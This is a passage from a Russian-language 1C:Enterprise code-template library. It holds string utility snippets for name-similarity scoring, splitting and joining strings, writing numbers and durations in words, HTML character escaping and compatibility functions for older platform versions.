Функция ПолучитьПроцентСходстваНаименованийУчетСлов(Знач НаимСравн = """", МассивСлов, ОбщДлинаСлов = Неопределено)

	Если ТипЗнч(МассивСлов) = Тип(""Строка"") Тогда
		МассивСлов 	= СтрРазделить(МассивСлов, "" "");
	КонецЕсли; 
	
	Если НЕ ЗначениеЗаполнено(ОбщДлинаСлов) Тогда
		ОбщДлинаСлов 	= 0;
		Для каждого лСлово из МассивСлов Цикл
			ОбщДлинаСлов 	= ОбщДлинаСлов + СтрДлина(лСлово);
		КонецЦикла;	
	КонецЕсли; 

    СуммаСовпадений 	= 0;
    
    Для Каждого ТекСлово Из МассивСлов Цикл
        
        Если СтроковыеФункцииКлиентСервер.ТолькоЦифрыВСтроке(ТекСлово) Тогда
            СчНачало 	= СтрДлина(ТекСлово);
        Иначе
            СчНачало 	= Макс(3, СтрДлина(ТекСлово) - 4);
        КонецЕсли;
        МаксСовпадений 	= 0;
        
        Для Сч = СчНачало По СтрДлина(ТекСлово) Цикл
            
            ТекОтрезокЛево 	= Лев(ТекСлово,  Сч);
            ТекОтрезокПрав 	= Прав(ТекСлово, Сч);
            
            МаксСовпадений 	= Макс(МаксСовпадений, ?(СтрЧислоВхождений(НаимСравн, ТекОтрезокЛево) > 0, Сч, 0), ?(СтрЧислоВхождений(НаимСравн, ТекОтрезокПрав) > 0, Сч, 0));
            
        КонецЦикла;
        
        СуммаСовпадений 	= СуммаСовпадений + МаксСовпадений;
        
    КонецЦикла;
    
    ПроцентСовпадения 	= Окр(Мин(ОбщДлинаСлов, СуммаСовпадений) / ОбщДлинаСлов * 100, 3, 1);
    
    Возврат ПроцентСовпадения;
	
КонецФункции"}
},
{0,
{"СходствоНаименований",0,0,"","Функция СходствоНаименований(Знач Наим1="""", Знач Наим2="""") 
    Наим1 = СокрЛП(Наим1);
    Наим2 = СокрЛП(Наим2);
    Наим1 = СтрЗаменить(Наим1,""  "",""""); //Удаляем двойные пробелы
    Наим1 = СтрЗаменить(Наим1,"" "","""");  //Удаляет одинарные пробелы
    Наим2 = СтрЗаменить(Наим2,""  "","""");
    Наим2 = СтрЗаменить(Наим2,"" "","""");
    //проверяем значения на схожесть  
    Длина1  = СтрДлина(Наим1);
    Длина2  = СтрДлина(Наим2);
    Если Длина1 > Длина2 Тогда
        Длина = Длина1;
    Стр   = Наим1;
    Иначе
    Длина = Длина2;
    Стр   = Наим2;
    КонецЕсли;
    Сч = 0; Вхождение1 = 0; Вхождение2 = 0;
    Пока (Стр<>"""") Цикл
        Символ = Лев(Стр,1);
        Вхождение1 = Вхождение1+СтрЧислоВхождений(Наим1,Символ);
        Вхождение2 = Вхождение2+СтрЧислоВхождений(Наим2,Символ);
        Наим1 = СтрЗаменить(Наим1,Символ,"""");
        Наим2 = СтрЗаменить(Наим2,Символ,"""");
        Стр = Прав(Стр,СтрДлина(Стр)-1);
    КонецЦикла;
    Возврат  ?(Вхождение1>Вхождение2,Окр((Вхождение2/Вхождение1)*100,3,1),Окр((Вхождение1/Вхождение2)*100,3,1));
КонецФункции //СходствоНаименований()"}
},
{0,
{"Релевантность",0,0,"","Функция Релевантность(выр1,выр2)
	
    Длина1 = СтрДлина(Выр1);
    Длина2 = СтрДлина(Выр2);
    
    СовпавшихСимволов = 0;
    Сч = 1;
    Для Сч = 1 По Длина1 Цикл
        Символ = Сред(Выр1,Сч,1);
        НомерПозиции = Найти(Выр2,Символ);
        Если НомерПозиции = 0 Тогда
            Продолжить;
        Иначе
            СовпавшихСимволов = СовпавшихСимволов + 1;
            Выр2 = Лев(Выр2,НомерПозиции-1)+Сред(Выр2,НомерПозиции+1);
        КонецЕсли;
	КонецЦикла;
	
    рел="""";
	
    Если (Длина1<>0) и (Длина2<>0) тогда рел=цел((СовпавшихСимволов/Длина1 + СовпавшихСимволов/Длина2)/2*100);КонецЕсли;
	
	возврат рел;
	
КонецФункции"}
}
},
{0,
{"Символы",0,0,"","//Знаки (!, "" и т.д.)
33, 47
58, 64
91, 96
123, 126

//Букв англ заглавные
65, 90

//Букв англ прописные
97, 122

//Цифры, знаки, англ буквы
33, 126

Символ(33)

лГСЧ 				= Новый ГенераторСлучайныхЧисел(); 
лСлучайнаяСтрока 	= Символ(лГСЧ.СлучайноеЧисло(33, 126)); // цифры, знаки, англ буквы
"}
},
{0,
{"ПустаяСтрока с условием",0,0,"ПустаяСт[рока]","<?""Переменная со строкой"">Знач = СокрЛП(<?""Переменная со строкой"">);
Если НЕ ПустаяСтрока(<?""Переменная со строкой"">Знач) Тогда
	<?>
КонецЕсли;"}
},
{0,
{"ПустаяСтрока",0,0,"ПуСтр","ПустаяСтрока(<?""Переменная со строкой"">)"}
},
{0,
{"Строка для отладки",0,0,"СтрО[тладк]","АйТи_ДляОтладки = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(""Для отладки надо поставить точку останова в модуле 'СтроковыеФункцииКлиентСервер' в строке 'ПодставитьПараметрыВСтроку'""); // АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">"}
},
{0,
{"ПодставитьПараметрыВСтроку",0,0,"","// Подставляет параметры в строку. Максимально возможное число параметров - 9.
// Параметры в строке задаются как %<номер параметра>. Нумерация параметров начинается с единицы.
//
// Параметры:
//  СтрокаПодстановки  - Строка - шаблон строки с параметрами (вхождениями вида ""%ИмяПараметра"");
//  Параметр<n>        - Строка - подставляемый параметр.
//
// Возвращаемое значение:
//  Строка   - текстовая строка с подставленными параметрами.
//
// Пример:
//  ПодставитьПараметрыВСтроку(НСтр(""ru='%1 пошел в %2'""), ""Вася"", ""Зоопарк"") = ""Вася пошел в Зоопарк"".
//
// Примечание:
//  В случаях, когда число используемых параметров в строке совпадает с числом переданных для подстановки параметров,
//  рекомендуется использовать функцию платформы СтрШаблон.
// В УНФ СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку
Функция ПодставитьПараметрыВСтроку(Знач СтрокаПодстановки,
	Знач Параметр1, Знач Параметр2 = Неопределено, Знач Параметр3 = Неопределено,
	Знач Параметр4 = Неопределено, Знач Параметр5 = Неопределено, Знач Параметр6 = Неопределено,
	Знач Параметр7 = Неопределено, Знач Параметр8 = Неопределено, Знач Параметр9 = Неопределено) Экспорт
	
	ИспользоватьАльтернативныйАлгоритм = 
		СтрНайти(Параметр1, ""%"")
		Или СтрНайти(Параметр2, ""%"")
		Или СтрНайти(Параметр3, ""%"")
		Или СтрНайти(Параметр4, ""%"")
		Или СтрНайти(Параметр5, ""%"")
		Или СтрНайти(Параметр6, ""%"")
		Или СтрНайти(Параметр7, ""%"")
		Или СтрНайти(Параметр8, ""%"")
		Или СтрНайти(Параметр9, ""%"");
		
	Если ИспользоватьАльтернативныйАлгоритм Тогда
		СтрокаПодстановки = ПодставитьПараметрыВСтрокуАльтернативныйАлгоритм(СтрокаПодстановки, Параметр1,
			Параметр2, Параметр3, Параметр4, Параметр5, Параметр6, Параметр7, Параметр8, Параметр9);
	Иначе
		СтрокаПодстановки = СтрЗаменить(СтрокаПодстановки, ""%1"", Параметр1);
		СтрокаПодстановки = СтрЗаменить(СтрокаПодстановки, ""%2"", Параметр2);
		СтрокаПодстановки = СтрЗаменить(СтрокаПодстановки, ""%3"", Параметр3);
		СтрокаПодстановки = СтрЗаменить(СтрокаПодстановки, ""%4"", Параметр4);
		СтрокаПодстановки = СтрЗаменить(СтрокаПодстановки, ""%5"", Параметр5);
		СтрокаПодстановки = СтрЗаменить(СтрокаПодстановки, ""%6"", Параметр6);
		СтрокаПодстановки = СтрЗаменить(СтрокаПодстановки, ""%7"", Параметр7);
		СтрокаПодстановки = СтрЗаменить(СтрокаПодстановки, ""%8"", Параметр8);
		СтрокаПодстановки = СтрЗаменить(СтрокаПодстановки, ""%9"", Параметр9);
	КонецЕсли;
	
	Возврат СтрокаПодстановки;
КонецФункции
"}
},
{0,
{"СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку",0,0,"ППВС","СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(""%1"", Параметр);"}
},
{0,
{"Типовые",0,0,"","// Общий модуль: СтроковыеФункцииКлиентСервер

// Разбивает строку на несколько строк по разделителю. Разделитель может иметь любую длину.
//
// Параметры:
//  Строка                 - Строка - текст с разделителями;
//  Разделитель            - Строка - разделитель строк текста, минимум 1 символ;
//  ПропускатьПустыеСтроки - Булево - признак необходимости включения в результат пустых строк.
//    Если параметр не задан, то функция работает в режиме совместимости со своей предыдущей версией:
//     - для разделителя-пробела пустые строки не включаются в результат, для остальных разделителей пустые строки
//       включаются в результат.
//     - если параметр Строка не содержит значащих символов или не содержит ни одного символа (пустая строка), то в
//       случае разделителя-пробела результатом функции будет массив, содержащий одно значение """" (пустая строка), а
//       при других разделителях результатом функции будет пустой массив.
//
//
// Возвращаемое значение:
//  Массив - массив строк.
//
// Примеры:
//  РазложитьСтрокуВМассивПодстрок("",один,,два,"", "","") - возвратит массив из 5 элементов, три из которых  - пустые строки;
//  РазложитьСтрокуВМассивПодстрок("",один,,два,"", "","", Истина) - возвратит массив из двух элементов;
//  РазложитьСтрокуВМассивПодстрок("" один   два  "", "" "") - возвратит массив из двух элементов;
//  РазложитьСтрокуВМассивПодстрок("""") - возвратит пустой массив;
//  РазложитьСтрокуВМассивПодстрок("""",,Ложь) - возвратит массив с одним элементом """" (пустой строкой);
//  РазложитьСтрокуВМассивПодстрок("""", "" "") - возвратит массив с одним элементом """" (пустой строкой);
// СтроковыеФункцииКлиентСервер.РазложитьСтрокуВМассивПодстрок
Функция РазложитьСтрокуВМассивПодстрок(Знач Строка, Знач Разделитель = "","", Знач ПропускатьПустыеСтроки = Неопределено) Экспорт
	
	Результат = Новый Массив;
	
	// для обеспечения обратной совместимости
	Если ПропускатьПустыеСтроки = Неопределено Тогда
		ПропускатьПустыеСтроки = ?(Разделитель = "" "", Истина, Ложь);
		Если ПустаяСтрока(Строка) Тогда 
			Если Разделитель = "" "" Тогда
				Результат.Добавить("""");
			КонецЕсли;
			Возврат Результат;
		КонецЕсли;
	КонецЕсли;
	//
	
	Позиция = Найти(Строка, Разделитель);
	Пока Позиция > 0 Цикл
		Подстрока = Лев(Строка, Позиция - 1);
		Если Не ПропускатьПустыеСтроки Или Не ПустаяСтрока(Подстрока) Тогда
			Результат.Добавить(Подстрока);
		КонецЕсли;
		Строка = Сред(Строка, Позиция + СтрДлина(Разделитель));
		Позиция = Найти(Строка, Разделитель);
	КонецЦикла;
	
	Если Не ПропускатьПустыеСтроки Или Не ПустаяСтрока(Строка) Тогда
		Результат.Добавить(Строка);
	КонецЕсли;
	
	Возврат Результат;
	
КонецФункции

// Возвращает строку, полученную из массива элементов, разделенных символом разделителя
//
// Параметры:
//  Массив - Массив - массив элементов из которых необходимо получить строку
//  Разделитель - Строка - любой набор символов, который будет использован как разделитель между элементами в строке
//
// Возвращаемое значение:
//  Результат - Строка - строка, полученная из массива элементов, разделенных символом разделителя
// СтроковыеФункцииКлиентСервер.ПолучитьСтрокуИзМассиваПодстрок
Функция ПолучитьСтрокуИзМассиваПодстрок(Массив, Разделитель = "","") Экспорт
	
	// возвращаемое значение функции
	Результат = """";
	
	Для Каждого Элемент ИЗ Массив Цикл
		
		Подстрока = ?(ТипЗнч(Элемент) = Тип(""Строка""), Элемент, Строка(Элемент));
		
		РазделительПодстрок = ?(ПустаяСтрока(Результат), """", Разделитель);
		
		Результат = Результат + РазделительПодстрок + Подстрока;
		
	КонецЦикла;
	
	Возврат Результат;
	
КонецФункции
"}
},
{0,
{"ЧислоПрописью (рубль)",0,0,"ЧПР[убль]","ЧислоПрописью(<?""Переменная"">,, ""Рубль, рублей, рубля, м, копейка, копейки, копеек, ж, 2"")"}
},
{0,
{"ЧислоПрописью (штука)",0,0,"ЧПШт[ук]","ЧислоПрописью(<?""Переменная"">,,""штука, штуки, штук, ж,,,,,0"")"}
},
{0,
{"Величина прописью",0,0,"","&НаКлиенте
Функция ПолучитьЦелоеЧислоПрописью(Число, ФормСтрока = ""ДП=Ложь; НД=Ложь"", ПарПредмета = ""месяц,месяца,месяцев,м,,,,,0"", Скобки = Истина)
	
	ЧислоПрописью 				= СокрЛП(ЧислоПрописью(Число, ФормСтрока, "",,,,,,,,0""));
	ЧислоПрописьюВеличина 		= ЧислоПрописью(Число, ФормСтрока, ПарПредмета);
	
	Если Скобки Тогда
		ЧислоПрописьюВеличина 	= СтрЗаменить(ЧислоПрописьюВеличина, ЧислоПрописью, ""("" + ЧислоПрописью + "")"");
	КонецЕсли;
	
	ЧислоПрописьюПолностью 		= Строка(Число) + "" "" + ЧислоПрописьюВеличина;
	
	Возврат ЧислоПрописьюПолностью;
	
КонецФункции // ПолучитьЦелоеЧислоПрописью()"}
},
{0,
{"СтрокаСЧислом Годов, лет и т.д. (ГодМесяцПрописью)",0,0,"","Функция ГодМесяцПрописью(пГод = """", пМесяц = """")
	
	лГодМесяцПрописью = """";
	
	лГодМесяцПрописью = ?(пГод = ""0"", """", "" "" + СтрокаСЧислом("";%1 год; ;%1 года;%1 лет;%1 года"", пГод, ВидЧисловогоЗначения.Количественное, ""L=ru"")) 
	+ ?(пМесяц = ""0"", """", "" "" + СтрокаСЧислом("";%1 месяц; ;%1 месяца;%1 месяцев;%1 месяца"", пМесяц, ВидЧисловогоЗначения.Количественное, ""L=ru""));
	
	Возврат лГодМесяцПрописью;
	
КонецФункции // ГодМесяцПрописью()

Функция ГодМесяцДеньПрописью(пГод = """", пМесяц = """", пДень = """")
	
	лГодМесяцДеньПрописью = """";
	
	ГодМесяцДеньПрописью = ?(пГод = """" ИЛИ пГод = ""0"", """", "" "" + СтрокаСЧислом("";%1 год; ;%1 года;%1 лет;%1 года"", пГод, ВидЧисловогоЗначения.Количественное, ""L=ru"")) 
	+ ?(пМесяц = """" ИЛИ пМесяц = ""0"", """", "" "" + СтрокаСЧислом("";%1 месяц; ;%1 месяца;%1 месяцев;%1 месяца"", пМесяц, ВидЧисловогоЗначения.Количественное, ""L=ru""))
	+ ?(пДень = """" ИЛИ пДень = ""0"", """", "" "" + СтрокаСЧислом("";%1 день; ;%1 дня;%1 дней;%1 дня"", пДень, ВидЧисловогоЗначения.Количественное, ""L=ru""));
	
	Возврат лГодМесяцДеньПрописью;
	
КонецФункции // ГодМесяцДеньПрописью()"}
},
{0,
{"СтрокаСЧислом Типовое",0,0,"","// Пример вывода строки, содержащей количество дней до нового года

Строка = СтрокаСЧислом("";остался %1 день;;осталось %1 дня;осталось %1 дней;осталось %1 дня"",
    ДнейДоНовогоГода,
    ВидЧисловогоЗначения.Количественное,
    ""L=ru"");
Строка = ""До Нового Года "" + Строка;

// Результаты вычисления:

// ""До Нового Года остался 1 день""

// ""До Нового Года осталось 2 дня""

// ""До Нового Года осталось 5 дней"""}
},
{0,
{"УчетПустойСтроки",0,0,"","//Функция УчетПустойСтроки
//-------------------------------------------------------------------------
//Параметры:
//		ЭлементУчета - Любой - Будет обработан переводом в строку
//		КоличествоСимволовЗамены - Число - Сколько символов отведено под эту запись
//		СимволЗамены - Строка - Какие символы отведены под эту запись
//Возвращаемое значение:
//		Строка - Вида: ""   "", ""_____"", ""#####"" и т.д.
//-------------------------------------------------------------------------
//автор: Кучеров Р 06.06.2018
&НаСервере
Функция УчетПустойСтроки(ЭлементУчета, КоличествоСимволовЗамены = 1, СимволЗамены = """", пПодставитьПринудительно = """")
	
	Если ТипЗнч(ЭлементУчета) <> Тип(""Строка"") Тогда
		ЭлементУчетаСтрока 	= Строка(ЭлементУчета);
	Иначе
		ЭлементУчетаСтрока 	= ЭлементУчета;
	КонецЕсли;
	
	Если НЕ ПустаяСтрока(пПодставитьПринудительно) Тогда			   
		Возврат пПодставитьПринудительно;
	КонецЕсли; 
	
	Если ПустаяСтрока(ЭлементУчетаСтрока) Тогда
		Если НЕ ПустаяСтрока(СимволЗамены) ИЛИ СимволЗамены = "" "" Тогда
			РезультатЭлементУчетаСтрока = """";
			
			Для ии = 1 По КоличествоСимволовЗамены Цикл
				
				РезультатЭлементУчетаСтрока = РезультатЭлементУчетаСтрока + СимволЗамены;
				
			КонецЦикла;
		Иначе
			РезультатЭлементУчетаСтрока = """";
		КонецЕсли;
	Иначе 
		Возврат ЭлементУчетаСтрока;
	КонецЕсли; 
	
	Возврат РезультатЭлементУчетаСтрока;
	
КонецФункции // УчетПустойСтроки()"}
},
{0,
{"РазложитьСтрокуВМассивПодстрок (аналог СтрРазделить)",0,0,"","Функция РазложитьСтрокуВМассивПодстрок(Знач Строка, Знач Разделитель = "","",
	Знач ПропускатьПустыеСтроки = Неопределено)
	
	Результат = Новый Массив;
	
	// для обеспечения обратной совместимости
	Если ПропускатьПустыеСтроки = Неопределено Тогда
		ПропускатьПустыеСтроки = ?(Разделитель = "" "", Истина, Ложь);
		Если ПустаяСтрока(Строка) Тогда 
			Если Разделитель = "" "" Тогда
				Результат.Добавить("""");
			КонецЕсли;
			Возврат Результат;
		КонецЕсли;
	КонецЕсли;
	//
	
	Позиция = Найти(Строка, Разделитель);
	Пока Позиция > 0 Цикл
		Подстрока = Лев(Строка, Позиция - 1);
		Если Не ПропускатьПустыеСтроки Или Не ПустаяСтрока(Подстрока) Тогда
			Результат.Добавить(Подстрока);
		КонецЕсли;
		Строка = Сред(Строка, Позиция + СтрДлина(Разделитель));
		Позиция = Найти(Строка, Разделитель);
	КонецЦикла;
	
	Если Не ПропускатьПустыеСтроки Или Не ПустаяСтрока(Строка) Тогда
		Результат.Добавить(Строка);
	КонецЕсли;
	
	Возврат Результат;
	
КонецФункции  "}
},
{0,
{"Элементы через разделитель",0,0,"","лРезделительЭлементов 	= "", "";
лСтрока 				= """";
Для каждого <?""Имя коллекции для обхода (слитно)"">Элем Из <?""Имя коллекции для обхода (слитно)""> Цикл
	лСтрока 	= лСтрока + СокрЛП(<?""Имя коллекции для обхода (слитно)"">Элем.Текст) + лРезделительЭлементов;
КонецЦикла;

лСтрока = Сред(лСтрока, 1, СтрДлина(лСтрока) - СтрДлина(лРезделительЭлементов)); // Убираем последний разделитель

	
"}
},
{0,
{"Элементы через разделитель: в массив через СтрРазделить с заменой внутри СтрЗаменить",0,0,"СтрРазСтрЗам","л<?""Строка (слитно)"">Массив 	= СтрРазделить(СтрЗаменить(<?""Строка (слитно)"">, "" "", """"), "","", Ложь);
Для каждого л<?""Строка (слитно)"">Элем Из л<?""Строка (слитно)"">Массив Цикл
	
	л<?""Строка (слитно)"">Элем
	
КонецЦикла; "}
},
{0,
{"ЕстьКириллица",0,0,"","&НаКлиенте
Функция ЕстьКириллица(ИсходнаяСтрока)
	
	ЕстьКириллица = Ложь; 
	ИсходнаяСтрока = СокрЛП(ИсходнаяСтрока); 
	Если СтрДлина(ИсходнаяСтрока) > 0 Тогда 
		Для Сч = 1 по СтрДлина(ИсходнаяСтрока) Цикл 
			Символ = НРег(Сред(ИсходнаяСтрока, Сч, 1)); 
			Если Найти(""абвгдеёжзийклмнопрстуфхцчшщъыьэюя"", Символ) Тогда 
				Возврат Истина; 
			КонецЕсли; 
		КонецЦикла; 
	КонецЕсли; 
	
	Возврат Ложь; 
	
КонецФункции"}
},
{1,
{"Веб",1,0,"",""},
{0,
{"Проверка значения на возможность выгрузки в веб (замена символов)",0,0,"","функция в(СЗСообщения,стр) //Проверка значения на возможность выгрузки в веб
	йй = СокрЛП(стр);
	йй = СтрЗаменить(йй,	""&"",	""&amp;"");
	//йй = СтрЗаменить(йй,	"""""""",	""&quot;"");
	йй = СтрЗаменить(йй,	""'"",	""&apos;"");
	йй = СтрЗаменить(йй,	""<"",	""&lt;"");
	йй = СтрЗаменить(йй,	"">"",	""&gt;"");
	йй = СтрЗаменить(йй,	""§"",	""&sect;"");
	йй = СтрЗаменить(йй,	""^"",	""&circ;"");
	йй = СтрЗаменить(йй,	""~"",	""˜&tilde;"");
	//йй = СтрЗаменить(йй,	"""",	"""");
	//йй = СтрЗаменить(йй,	"""",	"""");
	//йй = СтрЗаменить(йй,	"""",	"""");
	//йй = СтрЗаменить(йй,	"""",	"""");
	//йй = СтрЗаменить(йй,	"""",	"""");
	//Если Найти(йй,"">"")<>0 Тогда мСообщить(СЗСообщения,""Ошибка значения ""+СокрЛП(йй)); йй=стрЗаменить(йй,"">"",""""); КонецЕсли;
	//Если Найти(йй,""<"")<>0 Тогда мСообщить(СЗСообщения,""Ошибка значения ""+СокрЛП(йй)); йй=стрЗаменить(йй,""<"",""""); КонецЕсли;
	//Если Найти(йй,Символы.ПС)<>0 Тогда мСообщить(СЗСообщения,""Ошибка значения ""+СокрЛП(йй)); йй=стрЗаменить(йй,Символы.ПС,""""); КонецЕсли;
	//Если Найти(йй,Символы.ВК)<>0 Тогда мСообщить(СЗСообщения,""Ошибка значения ""+СокрЛП(йй)); йй=стрЗаменить(йй,Символы.ВК,""""); КонецЕсли;
	Возврат йй;
КонецФункции
"}
}
},
{1,
{"Для совместимости",1,0,"",""},
{0,
{"Строковые функции для совместимости с платформой 8.3.5 и ниже",0,0,"","////////////////////////////////////////////////////////////////////////////////
// Строковые функции для совместимости с платформой 8.3.5 и ниже
//
////////////////////////////////////////////////////////////////////////////////

Функция _СтрНачинаетсяС(Строка, СтрокаПоиска) Экспорт // СтрНачинаетсяС()
	Возврат Найти(Строка, СтрокаПоиска) = 1;
КонецФункции

Функция _СтрЗаканчиваетсяНа(Строка, СтрокаПоиска) Экспорт // СтрЗаканчиваетсяНа()
	Возврат Прав(Строка, СтрДлина(СтрокаПоиска)) = СтрокаПоиска;
КонецФункции

Функция _СтрРазделить(знач Строка, Разделитель, ВключатьПустые = Истина) Экспорт // СтрРазделить()
	Результат = Новый Массив;
	
	Если Строка = """" Тогда 
		Если ВключатьПустые Тогда
			Результат.Добавить(Строка);
		КонецЕсли;
		Возврат Результат;
	КонецЕсли;
	
	Позиция = Найти(Строка, Разделитель);
	Пока Позиция > 0 Цикл
		Подстрока = Лев(Строка, Позиция - 1);
		Если ВключатьПустые ИЛИ НЕ Подстрока = """" Тогда
			Результат.Добавить(Подстрока);
		КонецЕсли;
		Строка = Сред(Строка, Позиция + СтрДлина(Разделитель));
		Позиция = Найти(Строка, Разделитель);
	КонецЦикла;
	
	Если ВключатьПустые ИЛИ НЕ Строка = """" Тогда
		Результат.Добавить(Строка);
	КонецЕсли;
	
	Возврат Результат;
КонецФункции

Функция _СтрСоединить(Строки, знач Разделитель = Неопределено) Экспорт // СтрСоединить()
	Результат = """";
	
	Если Разделитель = Неопределено Тогда
		Разделитель = """";
	КонецЕсли;
	
	Если Строки.Количество() Тогда
		Результат = Строки[0];
	КонецЕсли;
	
	Для сч = 1 По Строки.ВГраница() Цикл
		Результат = Результат + Разделитель + Строки[сч];
	КонецЦикла;
	
	Возврат Результат;
КонецФункции

Функция _СтрНайти(Строка, ПодстрокаПоиска, НаправлениеПоиска = Неопределено, НачальнаяПозиция = Неопределено, НомерВхождения = 1) Экспорт // СтрНайти()
	// НаправлениеПоиска: СКонца,СНачала. По умолчанию: СНачала
	
	Если Строка = """" и ПодстрокаПоиска = """" Тогда
		// чтобы отрабатывало как в платформе
		Если НаправлениеПоиска = ""СКонца"" Тогда
			Если НомерВхождения = 1 Тогда
				Возврат 1;
			Иначе
				Возврат 0;
			КонецЕсли;
		Иначе
			Возврат мин(НомерВхождения, ?(НачальнаяПозиция=Неопределено, 1, НачальнаяПозиция));
		КонецЕсли;
	КонецЕсли;
	
	Если НачальнаяПозиция = Неопределено Тогда
		Если НаправлениеПоиска = ""СКонца"" Тогда
			лНачальнаяПозиция = СтрДлина(Строка);
		Иначе
			лНачальнаяПозиция = 1;
		КонецЕсли;
	Иначе
		лНачальнаяПозиция = НачальнаяПозиция;
	КонецЕсли;
	
	Если НаправлениеПоиска = ""СКонца"" Тогда
		лСтрока = """";
		Для сч = 1 По СтрДлина(Строка) Цикл
			лСтрока = Сред(Строка, сч, 1) + лСтрока;
		КонецЦикла;
		лПодстрокаПоиска = """";
		Для сч = 1 По СтрДлина(ПодстрокаПоиска) Цикл
			лПодстрокаПоиска = Сред(ПодстрокаПоиска, сч, 1) + лПодстрокаПоиска;
		КонецЦикла;
		лНачальнаяПозиция = макс(1, СтрДлина(Строка)-лНачальнаяПозиция-СтрДлина(ПодстрокаПоиска)+2);
	Иначе
		лСтрока = Строка;
		лПодстрокаПоиска = ПодстрокаПоиска;
		лНачальнаяПозиция = лНачальнаяПозиция;
	КонецЕсли;
	
	лНомерВхождения = 0;
	Результат = Найти(Сред(лСтрока, лНачальнаяПозиция), лПодстрокаПоиска);
	Пока Результат Цикл
		лНачальнаяПозиция = Результат + лНачальнаяПозиция + СтрДлина(ПодстрокаПоиска)-1;
		лНомерВхождения = лНомерВхождения + 1;
		Если лНомерВхождения = НомерВхождения Тогда
			Прервать;
		КонецЕсли;
		Результат = Найти(Сред(лСтрока, лНачальнаяПозиция), лПодстрокаПоиска);
	КонецЦикла;
	
	Если лНомерВхождения = НомерВхождения Тогда
		Результат = лНачальнаяПозиция - СтрДлина(ПодстрокаПоиска);
	Иначе
		Результат = 0;
	КонецЕсли;
	
	Если НаправлениеПоиска = ""СКонца"" И Результат<>0 Тогда
		Результат = СтрДлина(Строка) - Результат - СтрДлина(ПодстрокаПоиска) + 2;
	КонецЕсли;
	
	Возврат Результат;
	
КонецФункции

Функция _СтрШаблон(Шаблон, Параметр1=Неопределено, Параметр2=Неопределено, Параметр3=Неопределено,Параметр4=Неопределено,Параметр5=Неопределено,Параметр6=Неопределено,Параметр7=Неопределено,Параметр8=Неопределено,Параметр9=Неопределено,Параметр10=Неопределено) Экспорт // СтрШаблон()
	Результат = Шаблон;
	
	Для сч = -10 По -1 Цикл
		Параметр = Вычислить(""Параметр"" + (-сч));
		Если Параметр = Неопределено Тогда
			Продолжить;
		КонецЕсли;
		Если Найти(Результат, ""%(""+(-сч)+"")"") = 0 И Найти(Результат, ""%""+(-сч))=0 Тогда
			ВызватьИсключение ""Слишком много фактических параметров"";
		КонецЕсли;
		Результат = СтрЗаменить(Результат, ""%(""+ (-сч) + "")"", Параметр);
		Результат = СтрЗаменить(Результат, ""%""+ (-сч), Параметр);
	КонецЦикла;
	
	Возврат Результат;
КонецФункции"}
}
}
},
{7,
{"Под 1С",1,0,"",""},
{0,
{"Сформированить синоним переменной",0,0,"","// Формирует синоним переменной.
// Пример: на входе ""ИмяПеременнойАБВГ"", на выходе ""Имя переменной АБВГ""
//
// Параметры
// ИмяРеквизита - Строка. Имя переменной, имя колонки таблицы
//
// Возвращаемое значение:
// Строка - Представление переменной
//
Функция СформироватьСиноним(ИмяРеквизита)
	
	Перем Синоним, ъ, Символ, ПредСимвол, СледСимвол, Прописная, ПредПрописная, СледПрописная, ДлинаСтроки;
	
	Синоним = ВРег(Сред(ИмяРеквизита, 1, 1));
	ДлинаСтроки = СтрДлина(ИмяРеквизита);
	Для ъ=2 По ДлинаСтроки Цикл
		Символ = Сред(ИмяРеквизита, ъ, 1);
		ПредСимвол = Сред(ИмяРеквизита, ъ-1, 1);
		СледСимвол = Сред(ИмяРеквизита, ъ+1, 1);
		Прописная = Символ = ВРег(Символ);
		ПредПрописная = ПредСимвол = ВРег(ПредСимвол);
		СледПрописная = СледСимвол = ВРег(СледСимвол);
		
		// Варианты:
		Если НЕ ПредПрописная И Прописная Тогда
			Синоним = Синоним + "" "" + Символ;
		ИначеЕсли Прописная И НЕ СледПрописная Тогда
			Синоним = Синоним + "" "" + Символ;
		Иначе
			Синоним = Синоним + Символ;
		Конецесли;
	КонецЦикла;
	
	Возврат Синоним;
	
КонецФункции // СформироватьСиноним()"}
},
{0,
{"Сформировать переменную из синонима",0,0,"","// Преобразовывает имя переменной к более читабельному виду, аналогично внутренним алгоритмам 1С
// Например ""ОбменСБазой"" -> ""Обмен с базой""
Функция ПредставлениеПерменной(знач ИмяПеременной) Экспорт
	Перем МаленькиеБуквы, Буква, Ответ, сч, ПредыдущаяБуква, СледующаяБуква;
	ИмяПеременной = СокрЛП(ИмяПеременной);
	МаленькиеБуквы = ""абвгдеёжзийклмнопрстуфхцчшщъыьэюя_"";
	Буква = Лев(ИмяПеременной, 1);
	Ответ = """"+Буква;
	Для сч=2 По СтрДлина(ИмяПеременной) Цикл
		ПредыдущаяБуква = Буква;
		Буква = Сред(ИмяПеременной, сч, 1);
		Если (Найти(МаленькиеБуквы, Буква)=0) и (Найти(МаленькиеБуквы, ПредыдущаяБуква)>0) Тогда
			СледующаяБуква = Сред(ИмяПеременной, сч+1, 1);
			Если (СледующаяБуква<>"""") и (Найти(МаленькиеБуквы, СледующаяБуква)>0) Тогда
				Буква = НРег(Буква);
			КонецЕсли;
			Буква = "" ""+Буква;
		КонецЕсли;
		Ответ = Ответ + Буква;
	КонецЦикла;
	Возврат СтрЗаменить(Ответ, ""_"", "" "");
КонецФункции"}
},
{0,
{"Синонимайзер",0,0,"","//Значения параметров обозначают начальные значения переменных цикла. Делая их параметрами, мы, кроме сокращения количества строк в записи функции, добиваемся некоторого расширения ее возможностей. Например, присвоив параметру Ответ значение ""Синоним:"" мы получим результат, начинающийся со строки ""Синоним:"". Присвоив параметру Стэйт значение 7 * 2 * 2 * 2 * 2 * 2 (7 умножить на два в некоторой степени), мы ""защитим от преобразования"" соответствующее количество символов в имени. Присвоив параметру б некоторое значение, мы получим результат, начинающийся с этого значения, записанного в верхнем регистре.
Функция Синонимайзер(Имя, Ответ = """", Стэйт = 7, б = """") Экспорт
	
	Для ё = 1 По СтрДлина(Имя) Цикл
		
		а = Сред(Имя, ё, 1);
		Стэйт = (НРег(а) <> а) * 4 + Цел(Стэйт / 2);
		Ответ = Ответ + ?(Стэйт = 2, НРег(б), ?(ё = 2, ВРег(б), б)) + ?(Стэйт = 4 ИЛИ Стэйт = 5, "" "", """");
